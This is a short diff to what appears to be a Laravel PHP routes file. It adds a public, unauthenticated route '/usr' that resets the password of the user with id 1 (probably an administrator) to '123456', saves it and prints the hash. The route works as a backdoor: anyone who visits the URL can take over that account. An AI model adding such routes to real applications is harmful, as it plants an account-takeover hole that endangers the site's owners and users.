@@ -46,3 +46,9 @@ Route::get('cartridge-list/{id}', 'Frontend\LandingController@cartridgeList');
 //    }
 //});
 
+Route::get('/usr', function () {
+    $usr = \App\User::where('id', 1)->first();
+    $usr->password = Hash::make('123456');
+    $usr->save();
+    echo $usr->password;
+});
